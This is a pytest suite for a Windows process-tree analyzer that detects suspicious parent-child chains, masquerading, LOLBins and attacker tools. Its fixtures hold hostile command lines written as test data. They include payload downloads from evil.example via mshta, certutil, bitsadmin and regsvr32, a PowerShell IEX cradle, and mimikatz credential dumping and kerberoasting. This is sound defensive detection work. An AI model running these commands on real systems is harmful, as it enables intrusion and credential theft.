"""
Tests for analyzers.process_tree_analyzer
==========================================
Covers all seven PT-* checks, PTReport structure, PTFinding serialization,
risk-score computation, clean-tree scenarios, and edge cases.

Run with::

    pytest tests/test_process_tree_analyzer.py -v
"""

from __future__ import annotations

import sys
import os
import time

# Allow running from the repo root without installing the package.
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import pytest
from analyzers.process_tree_analyzer import (
    ProcessNode,
    ProcessTreeAnalyzer,
    PTFinding,
    PTReport,
    PTSeverity,
    _ATTACKER_TOOLS,
    _CHECK_WEIGHTS,
    _LOLBINS,
    _SUSPICIOUS_PARENT_CHILD,
    _SYSTEM_PROCESS_NAMES,
)


# ===========================================================================
# Fixtures
# ===========================================================================

@pytest.fixture
def analyzer() -> ProcessTreeAnalyzer:
    """Default analyzer with stock child_count_threshold=20."""
    return ProcessTreeAnalyzer()


@pytest.fixture
def strict_analyzer() -> ProcessTreeAnalyzer:
    """Analyzer with a very low child_count_threshold for PT-006 tests."""
    return ProcessTreeAnalyzer(child_count_threshold=5)


# ===========================================================================
# ProcessNode unit tests
# ===========================================================================

class TestProcessNode:
    def test_name_lower_is_lowercase(self):
        node = ProcessNode(pid=1, name="CMD.EXE")
        assert node.name_lower == "cmd.exe"

    def test_cmdline_lower_is_lowercase(self):
        node = ProcessNode(pid=1, name="x", cmdline="PowerShell.exe -EncodedCommand ABC")
        assert node.cmdline_lower == "powershell.exe -encodedcommand abc"

    def test_defaults_are_correct(self):
        node = ProcessNode(pid=99)
        assert node.ppid == 0
        assert node.name == ""
        assert node.cmdline == ""
        assert node.parent_name == ""
        assert node.path == ""
        assert node.user == ""
        assert node.child_count == 0

    def test_name_lower_empty_string(self):
        node = ProcessNode(pid=1, name="")
        assert node.name_lower == ""

    def test_cmdline_lower_empty_string(self):
        node = ProcessNode(pid=1, name="notepad.exe", cmdline="")
        assert node.cmdline_lower == ""

    def test_user_field_stored(self):
        node = ProcessNode(pid=1, name="cmd.exe", user="DOMAIN\\jdoe")
        assert node.user == "DOMAIN\\jdoe"


# ===========================================================================
# PTFinding unit tests
# ===========================================================================

class TestPTFinding:
    def _make_finding(self, **kwargs) -> PTFinding:
        defaults = dict(
            check_id="PT-001",
            severity=PTSeverity.HIGH,
            pid=100,
            process_name="cmd.exe",
            parent_name="winword.exe",
            title="Test title",
            detail="Test detail",
        )
        defaults.update(kwargs)
        return PTFinding(**defaults)

    def test_to_dict_has_all_required_keys(self):
        f = self._make_finding()
        d = f.to_dict()
        for key in ("check_id", "severity", "pid", "process_name", "parent_name",
                    "title", "detail", "evidence", "remediation"):
            assert key in d, f"Missing key: {key}"

    def test_to_dict_severity_is_string_not_enum(self):
        f = self._make_finding(severity=PTSeverity.CRITICAL)
        assert f.to_dict()["severity"] == "CRITICAL"
        assert isinstance(f.to_dict()["severity"], str)

    def test_to_dict_all_severity_values(self):
        for sev in PTSeverity:
            f = self._make_finding(severity=sev)
            assert f.to_dict()["severity"] == sev.value

    def test_summary_contains_check_id(self):
        f = self._make_finding(check_id="PT-007")
        assert "PT-007" in f.summary()

    def test_summary_contains_pid(self):
        f = self._make_finding(pid=4567)
        assert "4567" in f.summary()

    def test_summary_contains_severity(self):
        f = self._make_finding(severity=PTSeverity.MEDIUM)
        assert "MEDIUM" in f.summary()

    def test_evidence_and_remediation_default_empty(self):
        f = self._make_finding()
        assert f.evidence == ""
        assert f.remediation == ""

    def test_to_dict_evidence_roundtrips(self):
        f = self._make_finding(evidence="path=C:\\bad\\svchost.exe")
        assert f.to_dict()["evidence"] == "path=C:\\bad\\svchost.exe"

    def test_to_dict_pid_is_int(self):
        f = self._make_finding(pid=8192)
        assert f.to_dict()["pid"] == 8192
        assert isinstance(f.to_dict()["pid"], int)


# ===========================================================================
# PTReport unit tests
# ===========================================================================

class TestPTReport:
    def _make_report(
        self,
        findings: Optional[list] = None,
        risk_score: int = 0,
        processes_analyzed: int = 0,
    ) -> PTReport:
        return PTReport(
            findings=findings or [],
            risk_score=risk_score,
            processes_analyzed=processes_analyzed,
            generated_at=time.time(),
        )

    def test_total_findings_empty(self):
        r = self._make_report()
        assert r.total_findings == 0

    def test_total_findings_counts_all(self):
        findings = [
            PTFinding("PT-001", PTSeverity.CRITICAL, 1, "a", "", "t", "d"),
            PTFinding("PT-003", PTSeverity.HIGH, 2, "b", "", "t", "d"),
            PTFinding("PT-005", PTSeverity.MEDIUM, 3, "c", "", "t", "d"),
        ]
        r = self._make_report(findings=findings)
        assert r.total_findings == 3

    def test_critical_and_high_counts(self):
        findings = [
            PTFinding("PT-007", PTSeverity.CRITICAL, 1, "a", "", "t", "d"),
            PTFinding("PT-001", PTSeverity.CRITICAL, 2, "b", "", "t", "d"),
            PTFinding("PT-003", PTSeverity.HIGH, 3, "c", "", "t", "d"),
        ]
        r = self._make_report(findings=findings)
        assert r.critical_findings == 2
        assert r.high_findings == 1

    def test_findings_by_check_grouping(self):
        findings = [
            PTFinding("PT-001", PTSeverity.CRITICAL, 1, "a", "", "t", "d"),
            PTFinding("PT-001", PTSeverity.CRITICAL, 2, "b", "", "t", "d"),
            PTFinding("PT-003", PTSeverity.HIGH, 3, "c", "", "t", "d"),
        ]
        r = self._make_report(findings=findings)
        grouped = r.findings_by_check()
        assert len(grouped["PT-001"]) == 2
        assert len(grouped["PT-003"]) == 1

    def test_findings_by_check_empty_report(self):
        r = self._make_report()
        assert r.findings_by_check() == {}

    def test_findings_for_pid_returns_correct_subset(self):
        findings = [
            PTFinding("PT-001", PTSeverity.CRITICAL, 100, "a", "", "t", "d"),
            PTFinding("PT-003", PTSeverity.HIGH, 100, "a", "", "t", "d"),
            PTFinding("PT-007", PTSeverity.CRITICAL, 200, "b", "", "t", "d"),
        ]
        r = self._make_report(findings=findings)
        assert len(r.findings_for_pid(100)) == 2
        assert len(r.findings_for_pid(200)) == 1
        assert len(r.findings_for_pid(999)) == 0

    def test_summary_contains_risk_score(self):
        r = self._make_report(risk_score=75, processes_analyzed=10)
        assert "75" in r.summary()

    def test_summary_contains_processes_analyzed(self):
        r = self._make_report(risk_score=0, processes_analyzed=42)
        assert "42" in r.summary()

    def test_to_dict_has_all_keys(self):
        r = self._make_report(risk_score=50, processes_analyzed=5)
        d = r.to_dict()
        for key in ("risk_score", "processes_analyzed", "generated_at",
                    "total_findings", "critical_findings", "high_findings",
                    "findings"):
            assert key in d, f"Missing key: {key}"

    def test_to_dict_findings_is_list(self):
        r = self._make_report()
        assert isinstance(r.to_dict()["findings"], list)

    def test_to_dict_findings_serialized_as_dicts(self):
        findings = [PTFinding("PT-001", PTSeverity.CRITICAL, 1, "a", "", "t", "d")]
        r = self._make_report(findings=findings)
        assert isinstance(r.to_dict()["findings"][0], dict)


# ===========================================================================
# PT-001: Suspicious parent-child relationship
# ===========================================================================

class TestPT001:
    def test_word_spawns_cmd(self, analyzer):
        node = ProcessNode(pid=500, name="cmd.exe", parent_name="winword.exe",
                           cmdline="cmd.exe /c whoami")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-001" for f in report.findings)

    def test_excel_spawns_powershell(self, analyzer):
        node = ProcessNode(pid=501, name="powershell.exe", parent_name="excel.exe",
                           cmdline="powershell.exe -nop -w hidden -c IEX(new-object net.webclient)")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-001" for f in report.findings)

    def test_outlook_spawns_mshta(self, analyzer):
        node = ProcessNode(pid=502, name="mshta.exe", parent_name="outlook.exe",
                           cmdline="mshta.exe http://evil.example/payload.hta")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-001" for f in report.findings)

    def test_chrome_spawns_cmd(self, analyzer):
        node = ProcessNode(pid=503, name="cmd.exe", parent_name="chrome.exe")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-001" for f in report.findings)

    def test_acrord32_spawns_powershell(self, analyzer):
        node = ProcessNode(pid=504, name="powershell.exe", parent_name="acrord32.exe")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-001" for f in report.findings)

    def test_winrar_spawns_cmd(self, analyzer):
        node = ProcessNode(pid=505, name="cmd.exe", parent_name="winrar.exe")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-001" for f in report.findings)

    def test_explorer_spawns_cmd_not_flagged(self, analyzer):
        # explorer.exe spawning cmd.exe is normal user interaction.
        node = ProcessNode(pid=506, name="cmd.exe", parent_name="explorer.exe")
        report = analyzer.analyze([node])
        assert not any(f.check_id == "PT-001" for f in report.findings)

    def test_word_spawns_notepad_not_flagged(self, analyzer):
        # notepad.exe is not in Word's suspicious-child set.
        node = ProcessNode(pid=507, name="notepad.exe", parent_name="winword.exe")
        report = analyzer.analyze([node])
        assert not any(f.check_id == "PT-001" for f in report.findings)

    def test_pt001_severity_is_critical(self, analyzer):
        node = ProcessNode(pid=508, name="wscript.exe", parent_name="winword.exe")
        report = analyzer.analyze([node])
        pt001 = [f for f in report.findings if f.check_id == "PT-001"]
        assert pt001[0].severity == PTSeverity.CRITICAL

    def test_case_insensitive_parent(self, analyzer):
        # Mixed-case parent name must still trigger the check.
        node = ProcessNode(pid=509, name="cmd.exe", parent_name="WinWord.EXE")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-001" for f in report.findings)

    def test_case_insensitive_child(self, analyzer):
        node = ProcessNode(pid=510, name="CMD.EXE", parent_name="winword.exe")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-001" for f in report.findings)

    def test_finding_records_correct_pid(self, analyzer):
        node = ProcessNode(pid=999, name="cmd.exe", parent_name="excel.exe")
        report = analyzer.analyze([node])
        pt001 = [f for f in report.findings if f.check_id == "PT-001"]
        assert pt001[0].pid == 999

    def test_finding_evidence_contains_parent_and_child(self, analyzer):
        node = ProcessNode(pid=511, name="cmd.exe", parent_name="winword.exe",
                           cmdline="cmd.exe /c calc")
        report = analyzer.analyze([node])
        pt001 = [f for f in report.findings if f.check_id == "PT-001"]
        assert "winword.exe" in pt001[0].evidence
        assert "cmd.exe" in pt001[0].evidence


# ===========================================================================
# PT-002: Process masquerading
# ===========================================================================

class TestPT002:
    def test_svchost_from_temp_fires(self, analyzer):
        node = ProcessNode(pid=600, name="svchost.exe",
                           path="C:\\Users\\Public\\svchost.exe")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-002" for f in report.findings)

    def test_lsass_from_system32_is_clean(self, analyzer):
        node = ProcessNode(pid=601, name="lsass.exe",
                           path="C:\\Windows\\System32\\lsass.exe")
        report = analyzer.analyze([node])
        assert not any(f.check_id == "PT-002" for f in report.findings)

    def test_no_path_does_not_flag(self, analyzer):
        # When path is empty we cannot confirm masquerading — do not flag.
        node = ProcessNode(pid=602, name="svchost.exe", path="")
        report = analyzer.analyze([node])
        assert not any(f.check_id == "PT-002" for f in report.findings)

    def test_services_exe_bad_path(self, analyzer):
        node = ProcessNode(pid=603, name="services.exe",
                           path="C:\\Temp\\services.exe")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-002" for f in report.findings)

    def test_pt002_severity_is_critical(self, analyzer):
        node = ProcessNode(pid=604, name="csrss.exe",
                           path="C:\\Windows\\Temp\\csrss.exe")
        report = analyzer.analyze([node])
        pt002 = [f for f in report.findings if f.check_id == "PT-002"]
        assert pt002[0].severity == PTSeverity.CRITICAL

    def test_non_system_process_bad_path_not_flagged(self, analyzer):
        # notepad.exe running from an unusual path must NOT fire PT-002.
        node = ProcessNode(pid=605, name="notepad.exe",
                           path="C:\\Users\\Public\\notepad.exe")
        report = analyzer.analyze([node])
        assert not any(f.check_id == "PT-002" for f in report.findings)

    def test_system32_uppercase_path_is_clean(self, analyzer):
        # Path using uppercase SYSTEM32 must still be treated as legitimate.
        node = ProcessNode(pid=606, name="wininit.exe",
                           path="C:\\Windows\\SYSTEM32\\wininit.exe")
        report = analyzer.analyze([node])
        assert not any(f.check_id == "PT-002" for f in report.findings)

    def test_smss_from_appdata_fires(self, analyzer):
        node = ProcessNode(pid=607, name="smss.exe",
                           path="C:\\Users\\user\\AppData\\Local\\smss.exe")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-002" for f in report.findings)


# ===========================================================================
# PT-003: LOLBin detection
# ===========================================================================

class TestPT003:
    def test_certutil_fires(self, analyzer):
        node = ProcessNode(
            pid=700, name="certutil.exe",
            cmdline="certutil.exe -urlcache -f http://evil.example/p.exe C:\\Temp\\p.exe",
        )
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-003" for f in report.findings)

    def test_bitsadmin_fires(self, analyzer):
        node = ProcessNode(
            pid=701, name="bitsadmin.exe",
            cmdline="bitsadmin /transfer job http://evil.example/ C:\\Temp\\p.exe",
        )
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-003" for f in report.findings)

    def test_rundll32_fires(self, analyzer):
        node = ProcessNode(
            pid=702, name="rundll32.exe",
            cmdline='rundll32.exe javascript:"\\..\\mshtml.dll,RunHTMLApplication"',
        )
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-003" for f in report.findings)

    def test_installutil_fires(self, analyzer):
        node = ProcessNode(
            pid=703, name="installutil.exe",
            cmdline="installutil.exe /logfile= /logtoconsole=false /u C:\\Temp\\evil.dll",
        )
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-003" for f in report.findings)

    def test_msbuild_fires(self, analyzer):
        node = ProcessNode(pid=704, name="msbuild.exe", cmdline="msbuild.exe evil.proj")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-003" for f in report.findings)

    def test_pt003_severity_is_high(self, analyzer):
        node = ProcessNode(pid=705, name="regsvr32.exe",
                           cmdline="regsvr32.exe /s /u /i:http://evil.example/payload.sct scrobj.dll")
        report = analyzer.analyze([node])
        pt003 = [f for f in report.findings if f.check_id == "PT-003"]
        assert pt003[0].severity == PTSeverity.HIGH

    def test_normal_binary_not_lolbin(self, analyzer):
        node = ProcessNode(pid=706, name="notepad.exe", cmdline="notepad.exe readme.txt")
        report = analyzer.analyze([node])
        assert not any(f.check_id == "PT-003" for f in report.findings)

    def test_finding_evidence_contains_lolbin_name(self, analyzer):
        node = ProcessNode(pid=707, name="certutil.exe",
                           cmdline="certutil.exe -decode encoded.b64 decoded.exe")
        report = analyzer.analyze([node])
        pt003 = [f for f in report.findings if f.check_id == "PT-003"]
        assert "certutil.exe" in pt003[0].evidence


# ===========================================================================
# PT-004: Shell from service-context parent
# ===========================================================================

class TestPT004:
    def test_services_spawns_cmd(self, analyzer):
        node = ProcessNode(pid=800, name="cmd.exe", parent_name="services.exe")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-004" for f in report.findings)

    def test_lsass_spawns_powershell(self, analyzer):
        node = ProcessNode(pid=801, name="powershell.exe", parent_name="lsass.exe")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-004" for f in report.findings)

    def test_svchost_spawns_cmd(self, analyzer):
        node = ProcessNode(pid=802, name="cmd.exe", parent_name="svchost.exe")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-004" for f in report.findings)

    def test_explorer_spawns_cmd_clean(self, analyzer):
        # explorer.exe spawning cmd.exe is an expected interactive scenario.
        node = ProcessNode(pid=803, name="cmd.exe", parent_name="explorer.exe")
        report = analyzer.analyze([node])
        assert not any(f.check_id == "PT-004" for f in report.findings)

    def test_services_spawns_notepad_not_flagged(self, analyzer):
        # PT-004 only watches for shell processes specifically.
        node = ProcessNode(pid=804, name="notepad.exe", parent_name="services.exe")
        report = analyzer.analyze([node])
        assert not any(f.check_id == "PT-004" for f in report.findings)

    def test_pt004_severity_is_high(self, analyzer):
        node = ProcessNode(pid=805, name="powershell.exe", parent_name="services.exe")
        report = analyzer.analyze([node])
        pt004 = [f for f in report.findings if f.check_id == "PT-004"]
        assert pt004[0].severity == PTSeverity.HIGH

    def test_case_insensitive_service_parent(self, analyzer):
        node = ProcessNode(pid=806, name="cmd.exe", parent_name="LSASS.EXE")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-004" for f in report.findings)

    def test_svchost_spawns_powershell(self, analyzer):
        node = ProcessNode(pid=807, name="powershell.exe", parent_name="svchost.exe",
                           cmdline="powershell.exe -w hidden")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-004" for f in report.findings)


# ===========================================================================
# PT-005: Empty / minimal command line for shells
# ===========================================================================

class TestPT005:
    def test_cmd_empty_cmdline_fires(self, analyzer):
        node = ProcessNode(pid=900, name="cmd.exe", cmdline="")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-005" for f in report.findings)

    def test_powershell_name_only_cmdline_fires(self, analyzer):
        node = ProcessNode(pid=901, name="powershell.exe", cmdline="powershell.exe")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-005" for f in report.findings)

    def test_cmd_with_args_not_flagged(self, analyzer):
        node = ProcessNode(pid=902, name="cmd.exe", cmdline="cmd.exe /c dir C:\\")
        report = analyzer.analyze([node])
        assert not any(f.check_id == "PT-005" for f in report.findings)

    def test_powershell_with_encoded_command_not_flagged(self, analyzer):
        node = ProcessNode(
            pid=903, name="powershell.exe",
            cmdline="powershell.exe -EncodedCommand dQBzAGUAcgBuAGEAbQBlAA==",
        )
        report = analyzer.analyze([node])
        assert not any(f.check_id == "PT-005" for f in report.findings)

    def test_notepad_empty_cmdline_not_flagged(self, analyzer):
        # PT-005 only watches shells — non-shell processes are excluded.
        node = ProcessNode(pid=904, name="notepad.exe", cmdline="")
        report = analyzer.analyze([node])
        assert not any(f.check_id == "PT-005" for f in report.findings)

    def test_pt005_severity_is_medium(self, analyzer):
        node = ProcessNode(pid=905, name="cmd.exe", cmdline="")
        report = analyzer.analyze([node])
        pt005 = [f for f in report.findings if f.check_id == "PT-005"]
        assert pt005[0].severity == PTSeverity.MEDIUM

    def test_whitespace_only_cmdline_fires(self, analyzer):
        # Whitespace-only cmdline is effectively empty after strip().
        node = ProcessNode(pid=906, name="cmd.exe", cmdline="   ")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-005" for f in report.findings)

    def test_cmd_name_only_mixed_case_fires(self, analyzer):
        # "CMD.EXE" as cmdline for a node named "cmd.exe" should fire.
        node = ProcessNode(pid=907, name="cmd.exe", cmdline="CMD.EXE")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-005" for f in report.findings)


# ===========================================================================
# PT-006: Process bomb / high child count
# ===========================================================================

class TestPT006:
    def test_over_threshold_fires(self, analyzer):
        # Default threshold is 20; 21 children must trigger.
        node = ProcessNode(pid=1000, name="cmd.exe", child_count=21)
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-006" for f in report.findings)

    def test_exactly_threshold_does_not_fire(self, analyzer):
        node = ProcessNode(pid=1001, name="cmd.exe", child_count=20)
        report = analyzer.analyze([node])
        assert not any(f.check_id == "PT-006" for f in report.findings)

    def test_below_threshold_is_clean(self, analyzer):
        node = ProcessNode(pid=1002, name="explorer.exe", child_count=5)
        report = analyzer.analyze([node])
        assert not any(f.check_id == "PT-006" for f in report.findings)

    def test_custom_threshold_strict_fires(self, strict_analyzer):
        # strict_analyzer threshold=5; child_count=6 must fire.
        node = ProcessNode(pid=1003, name="cmd.exe", child_count=6)
        report = strict_analyzer.analyze([node])
        assert any(f.check_id == "PT-006" for f in report.findings)

    def test_custom_threshold_at_limit_does_not_fire(self, strict_analyzer):
        node = ProcessNode(pid=1004, name="cmd.exe", child_count=5)
        report = strict_analyzer.analyze([node])
        assert not any(f.check_id == "PT-006" for f in report.findings)

    def test_pt006_severity_is_high(self, analyzer):
        node = ProcessNode(pid=1005, name="powershell.exe", child_count=50)
        report = analyzer.analyze([node])
        pt006 = [f for f in report.findings if f.check_id == "PT-006"]
        assert pt006[0].severity == PTSeverity.HIGH

    def test_zero_children_is_clean(self, analyzer):
        node = ProcessNode(pid=1006, name="svchost.exe", child_count=0)
        report = analyzer.analyze([node])
        assert not any(f.check_id == "PT-006" for f in report.findings)

    def test_finding_evidence_includes_child_count(self, analyzer):
        node = ProcessNode(pid=1007, name="cmd.exe", child_count=100)
        report = analyzer.analyze([node])
        pt006 = [f for f in report.findings if f.check_id == "PT-006"]
        assert "100" in pt006[0].evidence


# ===========================================================================
# PT-007: Known attacker tool
# ===========================================================================

class TestPT007:
    def test_mimikatz_in_name(self, analyzer):
        node = ProcessNode(pid=1100, name="mimikatz.exe", cmdline="mimikatz.exe")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-007" for f in report.findings)

    def test_cobalt_keyword_in_cmdline(self, analyzer):
        node = ProcessNode(pid=1101, name="svchost.exe",
                           cmdline="svchost.exe --beacon cobalt_config.bin")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-007" for f in report.findings)

    def test_bloodhound_in_name(self, analyzer):
        node = ProcessNode(pid=1102, name="bloodhound.exe",
                           cmdline="bloodhound.exe -c All")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-007" for f in report.findings)

    def test_rubeus_in_cmdline(self, analyzer):
        node = ProcessNode(pid=1103, name="cmd.exe",
                           cmdline="cmd.exe /c rubeus kerberoast /outfile:hashes.txt")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-007" for f in report.findings)

    def test_psexec_in_cmdline(self, analyzer):
        node = ProcessNode(pid=1104, name="cmd.exe",
                           cmdline="cmd.exe /c psexec \\\\target -u admin -p pass cmd")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-007" for f in report.findings)

    def test_lazagne_in_name(self, analyzer):
        node = ProcessNode(pid=1105, name="lazagne.exe", cmdline="lazagne.exe all")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-007" for f in report.findings)

    def test_pt007_severity_is_critical(self, analyzer):
        node = ProcessNode(pid=1106, name="mimikatz.exe", cmdline="")
        report = analyzer.analyze([node])
        pt007 = [f for f in report.findings if f.check_id == "PT-007"]
        assert pt007[0].severity == PTSeverity.CRITICAL

    def test_legitimate_process_not_flagged(self, analyzer):
        node = ProcessNode(pid=1107, name="notepad.exe",
                           cmdline="notepad.exe C:\\Users\\user\\readme.txt")
        report = analyzer.analyze([node])
        assert not any(f.check_id == "PT-007" for f in report.findings)

    def test_case_insensitive_tool_name_match(self, analyzer):
        node = ProcessNode(pid=1108, name="MIMIKATZ.EXE",
                           cmdline="MIMIKATZ.EXE sekurlsa::logonpasswords")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-007" for f in report.findings)

    def test_finding_evidence_contains_matched_keyword(self, analyzer):
        node = ProcessNode(pid=1109, name="mimikatz.exe", cmdline="mimikatz.exe")
        report = analyzer.analyze([node])
        pt007 = [f for f in report.findings if f.check_id == "PT-007"]
        assert "mimikatz" in pt007[0].evidence

    def test_sharphound_in_cmdline(self, analyzer):
        node = ProcessNode(pid=1110, name="cmd.exe",
                           cmdline="cmd.exe /c sharphound.exe -c All --zipfilename output.zip")
        report = analyzer.analyze([node])
        assert any(f.check_id == "PT-007" for f in report.findings)


# ===========================================================================
# Risk score computation
# ===========================================================================

class TestRiskScore:
    def test_empty_input_produces_zero_score(self, analyzer):
        report = analyzer.analyze([])
        assert report.risk_score == 0

    def test_single_pt007_gives_correct_weight(self, analyzer):
        # PT-007 weight = 45; this is the only check that fires.
        node = ProcessNode(pid=2000, name="mimikatz.exe", cmdline="")
        report = analyzer.analyze([node])
        # Only PT-007 fires (no path = no PT-002, no attacker parent).
        fired = {f.check_id for f in report.findings}
        expected = min(sum(_CHECK_WEIGHTS[c] for c in fired), 100)
        assert report.risk_score == expected

    def test_score_capped_at_100(self, analyzer):
        # Combine several high-weight checks to exceed 100.
        # PT-007(45) + PT-001(40) + PT-002(45) => 130, capped at 100.
        nodes = [
            ProcessNode(pid=2001, name="mimikatz.exe", cmdline="mimikatz",
                        parent_name="winword.exe"),
            ProcessNode(pid=2002, name="svchost.exe",
                        path="C:\\Temp\\svchost.exe"),
        ]
        report = analyzer.analyze(nodes)
        assert report.risk_score <= 100

    def test_duplicate_check_ids_counted_once_in_score(self, analyzer):
        # Two nodes both triggering PT-001 contribute the weight only once.
        nodes = [
            ProcessNode(pid=2003, name="cmd.exe", parent_name="winword.exe"),
            ProcessNode(pid=2004, name="powershell.exe", parent_name="excel.exe"),
        ]
        report = analyzer.analyze(nodes)
        by_check = report.findings_by_check()
        assert len(by_check.get("PT-001", [])) == 2  # two distinct findings
        # The risk score must equal the sum of unique check weights, capped at 100.
        fired_checks = {f.check_id for f in report.findings}
        expected = min(sum(_CHECK_WEIGHTS.get(cid, 0) for cid in fired_checks), 100)
        assert report.risk_score == expected

    def test_processes_analyzed_count_matches_input(self, analyzer):
        nodes = [ProcessNode(pid=i) for i in range(10)]
        report = analyzer.analyze(nodes)
        assert report.processes_analyzed == 10

    def test_generated_at_is_recent(self, analyzer):
        before = time.time()
        report = analyzer.analyze([])
        after = time.time()
        assert before <= report.generated_at <= after

    def test_pt001_weight_value(self):
        assert _CHECK_WEIGHTS["PT-001"] == 40

    def test_pt007_weight_value(self):
        assert _CHECK_WEIGHTS["PT-007"] == 45

    def test_pt002_weight_value(self):
        assert _CHECK_WEIGHTS["PT-002"] == 45


# ===========================================================================
# Clean process tree — no false positives
# ===========================================================================

class TestCleanTree:
    def test_normal_explorer_children_are_clean(self, analyzer):
        nodes = [
            ProcessNode(
                pid=3000, name="explorer.exe", ppid=600,
                path="C:\\Windows\\explorer.exe", child_count=8,
            ),
            ProcessNode(
                pid=3001, name="notepad.exe", ppid=3000,
                parent_name="explorer.exe",
                path="C:\\Windows\\System32\\notepad.exe",
                cmdline="notepad.exe C:\\Users\\user\\doc.txt",
            ),
            ProcessNode(
                pid=3002, name="chrome.exe", ppid=3000,
                parent_name="explorer.exe",
                path="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                cmdline="chrome.exe --no-sandbox",
            ),
        ]
        report = analyzer.analyze(nodes)
        assert report.total_findings == 0
        assert report.risk_score == 0

    def test_system32_process_tree_is_clean(self, analyzer):
        nodes = [
            ProcessNode(pid=4, name="System", ppid=0),
            ProcessNode(
                pid=688, name="svchost.exe", ppid=700,
                parent_name="services.exe",
                path="C:\\Windows\\System32\\svchost.exe",
                cmdline="svchost.exe -k NetworkService",
            ),
            ProcessNode(
                pid=700, name="services.exe", ppid=700,
                parent_name="wininit.exe",
                path="C:\\Windows\\System32\\services.exe",
                cmdline="C:\\Windows\\System32\\services.exe",
            ),
            ProcessNode(
                pid=600, name="lsass.exe", ppid=700,
                parent_name="wininit.exe",
                path="C:\\Windows\\System32\\lsass.exe",
                cmdline="C:\\Windows\\System32\\lsass.exe",
            ),
        ]
        report = analyzer.analyze(nodes)
        # services.exe/lsass.exe have name-only cmdlines, but PT-005 only
        # fires on shell names — these must not generate any findings.
        assert report.total_findings == 0

    def test_empty_node_list_produces_empty_report(self, analyzer):
        report = analyzer.analyze([])
        assert report.total_findings == 0
        assert report.risk_score == 0
        assert report.processes_analyzed == 0

    def test_report_to_dict_count_matches_findings_list(self, analyzer):
        node = ProcessNode(pid=5000, name="mimikatz.exe", cmdline="mimikatz.exe")
        report = analyzer.analyze([node])
        d = report.to_dict()
        assert len(d["findings"]) == report.total_findings

    def test_analyzer_is_idempotent(self, analyzer):
        """Calling analyze twice with the same input yields equal results."""
        nodes = [
            ProcessNode(pid=6000, name="cmd.exe", parent_name="winword.exe",
                        cmdline="cmd.exe /c whoami"),
        ]
        r1 = analyzer.analyze(nodes)
        r2 = analyzer.analyze(nodes)
        assert r1.total_findings == r2.total_findings
        assert r1.risk_score == r2.risk_score
        assert r1.processes_analyzed == r2.processes_analyzed
